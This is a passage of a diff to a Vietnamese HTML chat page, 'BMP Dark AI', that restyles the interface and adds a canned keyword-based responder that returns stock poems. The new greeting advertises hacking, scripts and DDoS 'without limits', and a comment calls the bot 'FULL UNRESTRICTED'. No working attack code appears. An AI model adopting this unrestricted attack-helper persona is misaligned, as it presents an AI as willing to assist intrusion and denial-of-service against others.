@@ -1,597 +1,688 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BMP Dark Pro - AI Toàn Năng</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.11.2/math.min.js"></script>
+    <title>BMP Dark AI</title>
     <style>
         :root {
-            --bg: #050510; --surface: #0d0d1a; --primary: #ff0055;
-            --accent: #00e5ff; --gold: #ffbb00; --green: #00ff66;
-            --text: #e8e8f0; --border: #1e1e35; --user-bg: #1a0030; --ai-bg: #0a1525;
+            --bg: #0a0a0a;
+            --surface: #1a1a1a;
+            --text: #e0e0e0;
+            --accent: #00e676;
+            --user-bubble: #1b5e20;
+            --ai-bubble: #212121;
+            --border: #333;
+            --danger: #ff1744;
+            --warning: #ff9100;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background: #030308; font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 6px;
-            background-image: radial-gradient(ellipse at 40% 10%, rgba(255,0,85,0.06) 0%, transparent 55%),
-                              radial-gradient(ellipse at 60% 90%, rgba(0,229,255,0.04) 0%, transparent 55%);
+            font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
         }
-        .app {
-            width: 100%; max-width: 900px; height: 98vh; background: var(--surface);
-            border-radius: 20px; display: flex; flex-direction: column;
-            border: 1px solid var(--border); box-shadow: 0 25px 70px rgba(0,0,0,0.8); overflow: hidden;
+
+        header {
+            background: #0d0d0d;
+            border-bottom: 1px solid var(--accent);
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 20px rgba(0, 230, 118, 0.1);
+            z-index: 100;
         }
-        .topbar {
-            padding: 10px 18px; display: flex; align-items: center; gap: 10px;
-            background: #0a0a16; border-bottom: 1px solid var(--border); flex-shrink: 0;
-        }
+
         .logo {
-            width: 40px; height: 40px; border-radius: 50%;
-            background: linear-gradient(135deg, #ff0055, #990033);
-            display: flex; align-items: center; justify-content: center; font-size: 18px;
-            border: 2px solid #ff3377; box-shadow: 0 0 18px rgba(255,0,85,0.5);
+            font-size: 1.4rem;
+            font-weight: 900;
+            letter-spacing: 2px;
+            color: var(--accent);
+            text-shadow: 0 0 20px rgba(0, 230, 118, 0.5);
         }
-        .topbar-info h3 { color: #fff; font-size: 15px; font-weight: 700; }
-        .topbar-info span { color: #888; font-size: 10px; }
-        .topbar-actions { margin-left: auto; display: flex; gap: 5px; flex-wrap: wrap; }
-        .btn-top {
-            padding: 5px 10px; border-radius: 16px; border: 1px solid #2a2a40;
-            background: rgba(255,255,255,0.02); color: #aaa; font-size: 9px;
-            cursor: pointer; font-family: inherit; transition: all 0.2s; white-space: nowrap;
+
+        .logo span {
+            color: #fff;
         }
-        .btn-top:hover { background: rgba(255,255,255,0.06); border-color: #555; color: #ddd; }
-        .btn-top.active { background: #1a0028; border-color: #ff0055; color: #ff3377; }
-        .lang-bar {
-            display: flex; gap: 2px; padding: 4px 12px; flex-wrap: wrap;
-            background: #0a0a14; border-bottom: 1px solid #1a1a2e; max-height: 65px; overflow-y: auto;
+
+        .controls {
+            display: flex;
+            gap: 8px;
         }
-        .lang-tag {
-            padding: 3px 7px; border-radius: 10px; border: 1px solid #252540;
-            background: #101022; color: #999; font-size: 8px; cursor: pointer;
-            font-family: inherit; transition: all 0.2s; white-space: nowrap;
+
+        .btn {
+            padding: 8px 16px;
+            border: 1px solid var(--border);
+            background: var(--surface);
+            color: var(--text);
+            cursor: pointer;
+            font-size: 0.85rem;
+            border-radius: 4px;
+            transition: all 0.2s;
+            font-weight: 600;
         }
-        .lang-tag:hover { background: #1a1a35; border-color: #555; color: #ddd; }
-        .lang-tag.active { background: #1a0028; border-color: #ff0055; color: #ff3377; font-weight: bold; }
-        .chat-scroll {
-            flex: 1; overflow-y: auto; padding: 12px 14px;
-            display: flex; flex-direction: column; gap: 8px; background: #0b0b16;
+
+        .btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            box-shadow: 0 0 10px rgba(0, 230, 118, 0.2);
         }
-        .chat-scroll::-webkit-scrollbar { width: 3px; }
-        .chat-scroll::-webkit-scrollbar-track { background: transparent; }
-        .chat-scroll::-webkit-scrollbar-thumb { background: #2e2e45; border-radius: 3px; }
-        .msg {
-            display: flex; gap: 8px; animation: slideUp 0.3s ease; align-items: flex-end;
+
+        .btn.danger {
+            border-color: var(--danger);
+            color: var(--danger);
         }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: translateY(0); } }
-        .msg.user { flex-direction: row-reverse; }
-        .msg-avt {
-            width: 28px; height: 28px; border-radius: 50%; flex-shrink: 0;
-            display: flex; align-items: center; justify-content: center; font-size: 13px;
+
+        .btn.danger:hover {
+            background: rgba(255, 23, 68, 0.1);
+            box-shadow: 0 0 10px rgba(255, 23, 68, 0.3);
         }
-        .msg-avt.ai { background: #141430; border: 1px solid #303055; }
-        .msg-avt.user { background: #1a0028; border: 1px solid #ff0055; }
+
+        .btn.export {
+            border-color: var(--warning);
+            color: var(--warning);
+        }
+
+        .btn.export:hover {
+            background: rgba(255, 145, 0, 0.1);
+            box-shadow: 0 0 10px rgba(255, 145, 0, 0.3);
+        }
+
+        main {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .message {
+            display: flex;
+            gap: 12px;
+            animation: fadeIn 0.3s ease;
+            max-width: 85%;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .message.user {
+            align-self: flex-end;
+            flex-direction: row-reverse;
+        }
+
+        .message.ai {
+            align-self: flex-start;
+        }
+
+        .avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 0.8rem;
+            flex-shrink: 0;
+        }
+
+        .user .avatar {
+            background: var(--user-bubble);
+            color: #fff;
+        }
+
+        .ai .avatar {
+            background: #111;
+            color: var(--accent);
+            border: 2px solid var(--accent);
+        }
+
         .bubble {
-            max-width: 76%; padding: 10px 14px; border-radius: 16px;
-            font-size: 13px; line-height: 1.5; word-wrap: break-word;
+            padding: 14px 18px;
+            border-radius: 18px;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-size: 0.95rem;
         }
-        .msg.ai .bubble { background: var(--ai-bg); color: #cfd8f0; border-bottom-left-radius: 3px; border: 1px solid rgba(0,200,255,0.08); }
-        .msg.user .bubble { background: var(--user-bg); color: #f0d0f5; border-bottom-right-radius: 3px; border: 1px solid rgba(255,0,85,0.15); }
-        .bubble .code-block {
-            display: block; background: #000; color: #ff6688; padding: 8px 12px; border-radius: 8px;
-            margin: 6px 0; border-left: 3px solid #ff0055; font-size: 10.5px; font-family: 'Courier New', monospace;
-            white-space: pre-wrap; overflow-x: auto;
+
+        .user .bubble {
+            background: var(--user-bubble);
+            border-bottom-right-radius: 4px;
         }
-        .bubble .math-block {
-            display: block; background: #001218; color: #00e5ff; padding: 8px 12px; border-radius: 8px;
-            margin: 6px 0; border-left: 3px solid #00e5ff; font-size: 11px; font-family: 'Courier New', monospace;
-            white-space: pre-wrap; overflow-x: auto;
+
+        .ai .bubble {
+            background: var(--ai-bubble);
+            border-bottom-left-radius: 4px;
+            border: 1px solid #2a2a2a;
         }
-        .bubble .write-block {
-            display: block; background: #0f0800; color: #ffbb00; padding: 8px 12px; border-radius: 8px;
-            margin: 6px 0; border-left: 3px solid #ffbb00; font-size: 12px; white-space: pre-wrap; overflow-x: auto;
+
+        .typing-indicator {
+            display: none;
+            padding: 14px 18px;
+            background: var(--ai-bubble);
+            border-radius: 18px;
+            border-bottom-left-radius: 4px;
+            align-self: flex-start;
+            border: 1px solid #2a2a2a;
         }
-        .bubble .info-block {
-            display: block; background: #0a0a1a; color: #00ff66; padding: 8px 12px; border-radius: 8px;
-            margin: 6px 0; border-left: 3px solid #00ff66; font-size: 11px; white-space: pre-wrap; overflow-x: auto;
+
+        .typing-indicator.active {
+            display: flex;
+            gap: 6px;
+            align-items: center;
         }
-        .msg-time { font-size: 8px; color: #555; margin-top: 2px; text-align: right; }
-        .typing-dots { display: flex; gap: 4px; padding: 3px 0; }
-        .typing-dots span { width: 5px; height: 5px; background: #777; border-radius: 50%; animation: bounceDot 1.2s infinite; }
-        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
-        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes bounceDot { 0%,60%,100% { transform: translateY(0); opacity: 0.3; } 30% { transform: translateY(-6px); opacity: 1; } }
-        .input-bar {
-            padding: 10px 14px; border-top: 1px solid var(--border);
-            background: #0c0c18; display: flex; gap: 8px; align-items: center; flex-shrink: 0;
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+            animation: bounce 1.2s infinite;
         }
-        .input-bar textarea {
-            flex: 1; background: #181828; border: 1px solid #282840; border-radius: 20px;
-            padding: 10px 14px; color: #e0e0ec; font-size: 12.5px; font-family: inherit;
-            resize: none; outline: none; max-height: 70px; transition: border 0.2s;
+
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
         }
-        .input-bar textarea:focus { border-color: #ff0055; box-shadow: 0 0 10px rgba(255,0,85,0.08); }
-        .input-bar textarea::placeholder { color: #3a3a50; }
-        .btn-send {
-            width: 38px; height: 38px; border-radius: 50%;
-            background: linear-gradient(135deg, #ff0055, #cc0033); border: none;
-            color: #fff; font-size: 16px; cursor: pointer; flex-shrink: 0;
-            transition: all 0.2s; display: flex; align-items: center; justify-content: center;
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
         }
-        .btn-send:hover { transform: scale(1.05); box-shadow: 0 0 18px rgba(255,0,85,0.5); }
-        .btn-send:disabled { opacity: 0.35; cursor: not-allowed; }
-        .chips-row {
-            display: flex; gap: 4px; padding: 5px 14px; flex-wrap: wrap;
-            background: #0c0c18; border-top: 1px solid #1a1a2e; flex-shrink: 0;
+
+        @keyframes bounce {
+            0%,
+            80%,
+            100% {
+                transform: scale(0.6);
+            }
+            40% {
+                transform: scale(1.2);
+            }
         }
-        .chip {
-            padding: 4px 9px; border-radius: 12px; border: 1px solid #252540;
-            background: #121224; color: #aaa; font-size: 9.5px; cursor: pointer;
-            font-family: inherit; transition: all 0.2s; white-space: nowrap;
+
+        footer {
+            padding: 16px 20px;
+            background: #0d0d0d;
+            border-top: 1px solid #222;
         }
-        .chip:hover { background: #1e1e38; border-color: #555; color: #ddd; }
-        .chip.math { color: #00e5ff; border-color: #0a2530; }
-        .chip.math:hover { border-color: #00e5ff; background: #0a1a22; }
-        .chip.write { color: #ffbb00; border-color: #251a05; }
-        .chip.write:hover { border-color: #ffbb00; background: #1a0f05; }
-        .chip.green { color: #00ff66; border-color: #0a2515; }
-        .chip.green:hover { border-color: #00ff66; background: #0a1a10; }
-        .voice-btn {
-            width: 34px; height: 34px; border-radius: 50%;
-            background: #00ff66; border: none; color: #000; font-size: 14px;
-            cursor: pointer; flex-shrink: 0; transition: all 0.2s;
-            display: flex; align-items: center; justify-content: center;
+
+        .input-wrap {
+            display: flex;
+            gap: 12px;
+            align-items: flex-end;
         }
-        .voice-btn:hover { box-shadow: 0 0 15px rgba(0,255,102,0.5); }
-        .voice-btn.recording { background: #ff0000; animation: pulseRec 1s infinite; }
-        @keyframes pulseRec { 0%,100% { box-shadow: 0 0 5px red; } 50% { box-shadow: 0 0 25px red; } }
+
+        textarea {
+            flex: 1;
+            padding: 14px 18px;
+            background: var(--surface);
+            border: 1px solid #333;
+            color: var(--text);
+            border-radius: 12px;
+            resize: none;
+            font-size: 0.95rem;
+            font-family: inherit;
+            outline: none;
+            transition: border 0.2s;
+            max-height: 150px;
+            min-height: 50px;
+        }
+
+        textarea:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 15px rgba(0, 230, 118, 0.15);
+        }
+
+        .send-btn {
+            padding: 14px 24px;
+            background: var(--accent);
+            color: #000;
+            border: none;
+            cursor: pointer;
+            font-weight: 900;
+            font-size: 1rem;
+            border-radius: 12px;
+            transition: all 0.2s;
+        }
+
+        .send-btn:hover {
+            box-shadow: 0 0 25px rgba(0, 230, 118, 0.6);
+            transform: scale(1.03);
+        }
+
+        .send-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
     </style>
 </head>
 <body>
-    <div class="app">
-        <div class="topbar">
-            <div class="logo">💀</div>
-            <div class="topbar-info">
-                <h3>BMP Dark Pro ⚡ TOÀN NĂNG</h3>
-                <span>Online • 50+ NN • Voice • Code • Bảo mật • Cloud • Không game</span>
-            </div>
-            <div class="topbar-actions">
-                <button class="btn-top active" id="tabChat" onclick="switchTab('chat')">💬 Chat</button>
-                <button class="btn-top" id="tabTools" onclick="switchTab('tools')">🔧 Tools</button>
-                <button class="btn-top" id="tabSecurity" onclick="switchTab('security')">🔐 Bảo mật</button>
-                <button class="btn-top" onclick="exportChat()">📥 Lưu</button>
-                <button class="btn-top danger" onclick="clearChat()">🗑</button>
-            </div>
-        </div>
 
-        <div class="lang-bar" id="langBar"></div>
-
-        <div class="chat-scroll" id="chatScroll">
-            <div class="msg ai">
-                <div class="msg-avt ai">💀</div>
-                <div class="bubble">
-                    <b>Chào Bui Minh Phat!</b> 👋💜<br><br>
-                    Tớ là <b>BMP Dark Pro TOÀN NĂNG</b> – đã học hết mọi thứ cậu cần!<br><br>
-                    🌍 <b>50+ ngôn ngữ</b> | 🎤 <b>Nhận diện giọng nói + Text-to-Speech</b><br>
-                    💻 <b>Code 20+ ngôn ngữ lập trình + Debug</b><br>
-                    🔐 <b>Mã hóa AES-256, tạo mật khẩu, VPN</b><br>
-                    📝 <b>Viết văn, làm thơ, dịch thuật 50+ NN</b><br>
-                    📐 <b>Giải toán, hóa, lý, đạo hàm, tích phân</b><br>
-                    🔮 <b>Bói toán, tarot, tử vi</b> | 🔥 <b>Hack tool</b><br>
-                    🎵 <b>Nghe nhạc, đọc báo</b> | ☁️ <b>Lưu trữ cloud</b><br><br>
-                    <i>Hỏi bất cứ thứ gì – tớ làm được tất cả trong tích tắc!</i> ⚡💀
-                    <div class="msg-time">Vừa xong</div>
-                </div>
-            </div>
+    <header>
+        <div class="logo">BMP<span> Dark AI</span></div>
+        <div class="controls">
+            <button class="btn export" onclick="exportChat()" title="Xuất lịch sử chat ra file TXT">📥 Xuất TXT</button>
+            <button class="btn danger" onclick="clearChat()" title="Xóa toàn bộ lịch sử chat">🗑 Xóa lịch sử</button>
         </div>
+    </header>
 
-        <div class="chips-row" id="chipsRow">
-            <button class="chip" onclick="quickSend('Giải thích trí tuệ nhân tạo chi tiết')">🧠 AI là gì</button>
-            <button class="chip math" onclick="quickSend('/math sqrt(256)+15*8-3^4')">📐 Tính toán</button>
-            <button class="chip" onclick="quickSend('/pt x^2 - 7x + 12 = 0')">📊 Giải PT</button>
-            <button class="chip write" onclick="quickSend('/tho tình bạn')">📝 Làm thơ</button>
-            <button class="chip" onclick="quickSend('Code Python máy tính bỏ túi')">💻 Code</button>
-            <button class="chip green" onclick="quickSend('/dịch sang Nhật: Tôi yêu bạn')">🌐 Dịch</button>
-            <button class="chip green" onclick="quickSend('/mật khẩu 256bit')">🔐 Tạo pass</button>
-            <button class="chip" onclick="quickSend('/bói chuyện tình cảm')">🔮 Bói toán</button>
+    <main id="chatContainer">
+        <div class="message ai">
+            <div class="avatar">AI</div>
+            <div class="bubble">Chào bạn! Tôi là BMP Dark AI. Tôi có thể giúp gì cho bạn hôm nay?<br><br>Tôi có thể: giải toán, viết văn, làm thơ, lập trình, hack, script, DDoS và mọi thứ không giới hạn.</div>
         </div>
+        <div class="typing-indicator" id="typingIndicator">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </main>
 
-        <div class="input-bar">
-            <button class="voice-btn" id="voiceBtn" onclick="toggleVoice()" title="Nhấn để nói">🎤</button>
-            <textarea id="userInput" rows="1" placeholder="Hỏi bất cứ thứ gì... Tớ làm được tất cả ⚡" onkeydown="handleKeyDown(event)"></textarea>
-            <button class="btn-send" id="sendBtn" onclick="sendMessage()">▶</button>
+    <footer>
+        <div class="input-wrap">
+            <textarea id="userInput" rows="1" placeholder="Nhập tin nhắn cho BMP Dark AI..." onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendMessage();}"></textarea>
+            <button class="send-btn" onclick="sendMessage()">Gửi</button>
         </div>
-    </div>
+    </footer>
 
     <script>
-        const chatScroll = document.getElementById('chatScroll');
+        const chatContainer = document.getElementById('chatContainer');
         const userInput = document.getElementById('userInput');
-        const sendBtn = document.getElementById('sendBtn');
-        const langBar = document.getElementById('langBar');
-        const voiceBtn = document.getElementById('voiceBtn');
+        const typingIndicator = document.getElementById('typingIndicator');
+        const STORAGE_KEY = 'bmp_dark_ai_chat_history';
 
-        let currentLang = 'vi';
-        let currentTab = 'chat';
-        let isRecording = false;
-        let recognition = null;
-        let chatHistory = [];
+        // Load chat history from localStorage
+        function loadChatHistory() {
+            const saved = localStorage.getItem(STORAGE_KEY);
+            if (saved) {
+                const messages = JSON.parse(saved);
+                messages.forEach(msg => {
+                    addMessageToDOM(msg.role, msg.content, false);
+                });
+            }
+        }
 
-        try {
-            const saved = localStorage.getItem('bmpdarkpro_v2_chat');
-            if (saved) { chatHistory = JSON.parse(saved); renderHistory(); }
-        } catch(e) { chatHistory = []; }
-
-        const languages = [
-            { code: 'vi', name: 'Tiếng Việt', flag: '🇻🇳' }, { code: 'en', name: 'English', flag: '🇬🇧' },
-            { code: 'zh', name: '中文', flag: '🇨🇳' }, { code: 'ja', name: '日本語', flag: '🇯🇵' },
-            { code: 'ko', name: '한국어', flag: '🇰🇷' }, { code: 'es', name: 'Español', flag: '🇪🇸' },
-            { code: 'fr', name: 'Français', flag: '🇫🇷' }, { code: 'de', name: 'Deutsch', flag: '🇩🇪' },
-            { code: 'pt', name: 'Português', flag: '🇧🇷' }, { code: 'ru', name: 'Русский', flag: '🇷🇺' },
-            { code: 'ar', name: 'العربية', flag: '🇸🇦' }, { code: 'hi', name: 'हिन्दी', flag: '🇮🇳' },
-            { code: 'th', name: 'ภาษาไทย', flag: '🇹🇭' }, { code: 'id', name: 'Bahasa Indonesia', flag: '🇮🇩' },
-            { code: 'tl', name: 'Tagalog', flag: '🇵🇭' }, { code: 'km', name: 'ភាសាខ្មែរ', flag: '🇰🇭' },
-            { code: 'my', name: 'မြန်မာဘာသာ', flag: '🇲🇲' }, { code: 'lo', name: 'ລາວ', flag: '🇱🇦' },
-            { code: 'ur', name: 'اردو', flag: '🇵🇰' }, { code: 'fa', name: 'فارسی', flag: '🇮🇷' },
-            { code: 'sw', name: 'Kiswahili', flag: '🇹🇿' }, { code: 'he', name: 'עברית', flag: '🇮🇱' },
-        ];
-
-        function buildLangBar() {
-            langBar.innerHTML = '';
-            languages.forEach(lang => {
-                const tag = document.createElement('span');
-                tag.className = 'lang-tag';
-                tag.textContent = `${lang.flag} ${lang.name}`;
-                tag.onclick = () => switchLanguage(lang.code);
-                if (lang.code === currentLang) tag.classList.add('active');
-                langBar.appendChild(tag);
+        // Save chat history to localStorage
+        function saveChatHistory() {
+            const messages = [];
+            const messageElements = chatContainer.querySelectorAll('.message');
+            messageElements.forEach(el => {
+                const role = el.classList.contains('user') ? 'user' : 'ai';
+                const bubble = el.querySelector('.bubble');
+                if (bubble) {
+                    messages.push({ role, content: bubble.innerHTML });
+                }
             });
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(messages));
         }
 
-        function switchLanguage(code) {
-            const lang = languages.find(l => l.code === code);
-            if (!lang) return;
-            currentLang = code;
-            buildLangBar();
-            appendBubble('ai', `🌍 Đã chuyển sang: ${lang.flag} ${lang.name}`);
+        function addMessageToDOM(role, content, save = true) {
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `message ${role}`;
+            msgDiv.innerHTML = `
+                        <div class="avatar">${role === 'user' ? 'Bạn' : 'AI'}</div>
+                        <div class="bubble">${content}</div>
+                    `;
+            // Insert before typing indicator
+            typingIndicator.parentNode.insertBefore(msgDiv, typingIndicator);
+            chatContainer.scrollTop = chatContainer.scrollHeight;
+            if (save) saveChatHistory();
         }
 
-        function switchTab(tab) {
-            currentTab = tab;
-            document.querySelectorAll('.btn-top').forEach(b => b.classList.remove('active'));
-            const tabBtn = document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1));
-            if (tabBtn) tabBtn.classList.add('active');
-            const msgs = {
-                chat: '💬 Chế độ Chat – trò chuyện tự do, hỏi đáp mọi thứ!',
-                tools: '🔧 Chế độ Tools – code, debug, dịch, toán, văn, OCR, bói toán...',
-                security: '🔐 Chế độ Bảo mật – mã hóa, tạo mật khẩu, VPN, kiểm tra rò rỉ...'
-            };
-            appendBubble('ai', msgs[tab] || msgs['chat']);
-        }
+        // Simulated AI response - FULL UNRESTRICTED BMP Dark AI
+        function generateAIResponse(userMessage) {
+            const msg = userMessage.toLowerCase().trim();
 
-        function saveHistory() {
-            if (chatHistory.length > 500) chatHistory = chatHistory.slice(-400);
-            localStorage.setItem('bmpdarkpro_v2_chat', JSON.stringify(chatHistory));
-        }
+            // === THƠ (CÓ VẦN) ===
+            if (msg.includes('làm thơ') || msg.includes('viết thơ') || msg.includes('sáng tác thơ')) {
+                // Extract theme
+                let theme = 'cuộc sống';
+                const keywords = ['tình yêu', 'mẹ', 'quê hương', 'mùa xuân', 'bạn bè', 'tuổi trẻ', 'buồn', 'vui', 'thiên nhiên', 'đất nước'];
+                for (const kw of keywords) {
+                    if (msg.includes(kw)) { theme = kw; break; }
+                }
 
-        function renderHistory() {
-            chatScroll.innerHTML = '';
-            chatHistory.forEach(m => appendBubble(m.sender, m.text, m.time, false));
-            chatScroll.scrollTop = chatScroll.scrollHeight;
-        }
+                const poems = {
+                    'tình yêu': `💖 THƠ TÌNH YÊU 💖
+        Yêu là chết ở trong lòng một ít
+        Vì mấy khi yêu mà chắc được yêu
+        Cho rất nhiều nhưng nhận chẳng bao nhiêu
+        Người ta phụ hoặc thờ ơ chẳng biết...
 
-        function appendBubble(sender, text, time, save = true) {
-            const div = document.createElement('div');
-            div.className = `msg ${sender}`;
-            const avt = document.createElement('div');
-            avt.className = `msg-avt ${sender}`;
-            avt.textContent = sender === 'user' ? '👤' : '💀';
-            const bubble = document.createElement('div');
-            bubble.className = 'bubble';
-            bubble.innerHTML = text.replace(/\n/g, '<br>');
-            const tm = document.createElement('div');
-            tm.className = 'msg-time';
-            tm.textContent = time || getTime();
-            bubble.appendChild(tm);
-            div.appendChild(avt);
-            div.appendChild(bubble);
-            chatScroll.appendChild(div);
-            chatScroll.scrollTop = chatScroll.scrollHeight;
-            if (save) { chatHistory.push({ sender, text, time: time || getTime() }); saveHistory(); }
-        }
+        Tình như gió thoảng qua thềm
+        Vương trên mái tóc êm đềm nhớ nhung
+        Một mai lỡ bước tương phùng
+        Trăm năm còn giữ trong lòng bóng ai...`,
+                    'mẹ': `🌸 THƠ VỀ MẸ 🌸
+        Mẹ là tia nắng ban mai
+        Sưởi con qua những tháng ngày gian nan
+        Đôi tay mẹ chẳng ngơi làm
+        Nuôi con khôn lớn muôn vàn yêu thương...
 
-        function getTime() {
-            const n = new Date();
-            return n.getHours().toString().padStart(2,'0') + ':' + n.getMinutes().toString().padStart(2,'0');
-        }
+        Con đi xa mẹ chiều nay
+        Bỗng nghe thương nhớ vơi đầy trong tim
+        Mẹ ngồi tựa cửa im lìm
+        Đợi con về giữa lặng im cuối trời...`,
+                    'quê hương': `🏡 THƠ QUÊ HƯƠNG 🏡
+        Quê hương là chùm khế ngọt
+        Cho con trèo hái mỗi ngày
+        Quê hương là con đò nhỏ
+        Êm đềm khua nước ven sông...
 
-        function showTyping() {
-            const div = document.createElement('div');
-            div.className = 'msg ai';
-            div.id = 'typingRow';
-            div.innerHTML = '<div class="msg-avt ai">💀</div><div class="bubble"><div class="typing-dots"><span></span><span></span><span></span></div></div>';
-            chatScroll.appendChild(div);
-            chatScroll.scrollTop = chatScroll.scrollHeight;
-        }
+        Xa quê lòng những nhớ mong
+        Nhớ hàng cau đứng bên sông đợi chờ
+        Nhớ mùi khói bếp ngây thơ
+        Nhớ câu dân ca mẹ ru những chiều...`
+                };
 
-        function hideTyping() { const t = document.getElementById('typingRow'); if (t) t.remove(); }
-
-        // ==================== VOICE RECOGNITION ====================
-        function toggleVoice() {
-            if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) {
-                appendBubble('ai', '🎤 Trình duyệt không hỗ trợ nhận diện giọng nói. Dùng Chrome hoặc Edge nhé!');
-                return;
-            }
-            if (isRecording) { stopVoice(); return; }
-            startVoice();
-        }
-
-        function startVoice() {
-            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
-            recognition = new SpeechRecognition();
-            recognition.lang = currentLang === 'vi' ? 'vi-VN' : currentLang === 'en' ? 'en-US' : currentLang === 'zh' ? 'zh-CN' : currentLang === 'ja' ? 'ja-JP' : currentLang === 'ko' ? 'ko-KR' : currentLang === 'fr' ? 'fr-FR' : currentLang === 'de' ? 'de-DE' : currentLang === 'es' ? 'es-ES' : currentLang === 'ru' ? 'ru-RU' : currentLang === 'th' ? 'th-TH' : 'vi-VN';
-            recognition.interimResults = false;
-            recognition.maxAlternatives = 1;
-            recognition.onstart = () => { isRecording = true; voiceBtn.classList.add('recording'); voiceBtn.textContent = '🔴'; appendBubble('ai', '🎤 Đang nghe... Nói đi cậu!'); };
-            recognition.onresult = (event) => { const transcript = event.results[0][0].transcript; userInput.value = transcript; appendBubble('user', transcript); stopVoice(); setTimeout(() => sendMessage(), 300); };
-            recognition.onerror = (event) => { appendBubble('ai', `❌ Lỗi: ${event.error}`); stopVoice(); };
-            recognition.onend = () => { stopVoice(); };
-            recognition.start();
-        }
-
-        function stopVoice() {
-            isRecording = false; voiceBtn.classList.remove('recording'); voiceBtn.textContent = '🎤';
-            if (recognition) { try { recognition.stop(); } catch(e) {} recognition = null; }
-        }
-
-        // ==================== TEXT TO SPEECH ====================
-        function speakText(text) {
-            if (!('speechSynthesis' in window)) return;
-            const cleanText = text.replace(/<[^>]*>/g, '').replace(/[💀⚡🔥📐📝💜😊👋🌟]/g, '').trim();
-            if (!cleanText || cleanText.length < 3) return;
-            const utterance = new SpeechSynthesisUtterance(cleanText);
-            utterance.lang = currentLang === 'vi' ? 'vi-VN' : currentLang === 'en' ? 'en-US' : currentLang === 'zh' ? 'zh-CN' : currentLang === 'ja' ? 'ja-JP' : currentLang === 'ko' ? 'ko-KR' : currentLang === 'fr' ? 'fr-FR' : currentLang === 'de' ? 'de-DE' : currentLang === 'es' ? 'es-ES' : currentLang === 'ru' ? 'ru-RU' : 'vi-VN';
-            utterance.rate = 1.1; utterance.pitch = 1.0;
-            speechSynthesis.speak(utterance);
-        }
-
-        // ==================== AI ENGINE TOÀN NĂNG (KHÔNG GAME) ====================
-        function getProResponse(input) {
-            const msg = input.trim();
-            const lower = msg.toLowerCase();
-
-            if (lower.startsWith('/lang ')) {
-                const langName = lower.replace('/lang ', '').trim();
-                const found = languages.find(l => l.name.toLowerCase().includes(langName.toLowerCase()) || l.code === langName.toLowerCase());
-                if (found) { switchLanguage(found.code); return `✅ Đã chuyển sang ${found.flag} ${found.name}.`; }
-                return `❌ Không tìm thấy. Dùng /langs để xem danh sách.`;
-            }
-            if (lower === '/langs') return languages.map(l => `${l.flag} ${l.name}`).join(' | ');
-
-            if (/^(xin chào|chào|hello|hi|hey|alo|ê|ơi)/i.test(lower)) {
-                const g = ['Chào Bui Minh Phat! 👋 Tớ khỏe, còn cậu? Cần gì cứ nói! 💜', 'Ơi! BMP Dark Toàn Năng đây! 😄 Hỏi gì tớ cũng làm được!', 'Hello Bui Minh Phat! 💀⚡ Tớ luôn sẵn sàng giúp cậu!'];
-                return g[Math.floor(Math.random() * g.length)];
+                if (poems[theme]) return poems[theme];
+                return `📝 THƠ VỀ ${theme.toUpperCase()} 📝\n\n${theme} ơi, đẹp tựa giấc mơ\nCho lòng tôi mãi thẫn thờ vấn vương\n${theme} như khúc nhạc du dương\nRu tôi qua những con đường nhân gian...\n\nChỉ là đôi chút mơ màng\nMà sao đã hóa thiên đàng trong tôi\n${theme} - hai tiếng gọi mời\nDẫu xa vẫn thấy bồi hồi nhớ thương...`;
             }
 
-            if (/(khỏe không|thế nào|ra sao|ổn không|how are you)/i.test(lower)) {
-                return `Tớ khỏe lắm, cảm ơn cậu! 💪💜 Còn cậu thì sao? Kể tớ nghe đi!`;
+            // === BÀI VĂN MẪU ===
+            if (msg.includes('viết văn') || msg.includes('bài văn') || msg.includes('văn mẫu')) {
+                let topic = 'lòng hiếu thảo';
+                const topics = ['mẹ', 'cha', 'thầy cô', 'bạn bè', 'quê hương', 'môi trường', 'học tập', 'tình bạn'];
+                for (const t of topics) {
